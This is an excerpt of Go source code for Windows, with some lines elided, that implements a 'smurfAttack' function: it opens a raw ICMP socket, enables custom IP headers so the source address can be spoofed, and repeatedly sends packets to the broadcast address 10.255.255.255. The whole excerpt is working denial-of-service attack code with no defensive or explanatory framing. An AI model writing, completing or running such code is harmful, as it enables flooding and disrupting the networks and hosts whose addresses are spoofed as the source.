...
func smurfAttack(sourceIP string, packetSize int, numRequests int) {
	rawSocket, err := windows.Socket(windows.AF_INET, windows.SOCK_RAW, windows.IPPROTO_ICMP)
	if err != nil {
		log.Fatalf("Failed to create raw socket: %v", err)
	}
	defer windows.Closesocket(rawSocket)

	err = windows.SetsockoptInt(rawSocket, windows.IPPROTO_IP, windows.IP_HDRINCL, 1)
	if err != nil {
		log.Fatalf("Failed to set IP_HDRINCL: %v", err)
	}

	srcIP := net.ParseIP(sourceIP).To4()
	destIP := net.ParseIP("10.255.255.255").To4()
	...
	for i := 0; i < numRequests; i++ {
		...
		addr := windows.SockaddrInet4{Port: 0, Addr: [4]byte{destIP[0], destIP[1], destIP[2], destIP[3]}}

		err := windows.Sendto(rawSocket, packet, 0, &addr)
		if err != nil {
			log.Printf("Failed to send packet: %v", err)
		}
		fmt.Println("sended smurf packet.")
